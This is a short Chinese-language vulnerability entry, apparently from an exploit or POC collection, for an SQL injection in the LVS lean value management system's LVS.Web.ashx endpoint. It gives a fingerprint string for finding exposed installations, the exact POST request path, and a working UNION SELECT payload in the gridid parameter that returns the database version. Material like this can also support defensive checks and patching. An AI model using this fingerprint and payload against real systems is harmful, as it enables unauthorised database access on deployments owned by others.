# LVS精益价值管理系统LVS.Web.ashx存在SQL注入漏洞

LVS ｜ SQL注入 ｜ —
- **指纹**：`body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"`
- **请求**：`POST /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r HTTP/1.1`

**Payload**
```
src=AgencytaskList
gridid=1' UNION ALL SELECT @@VERSION--
```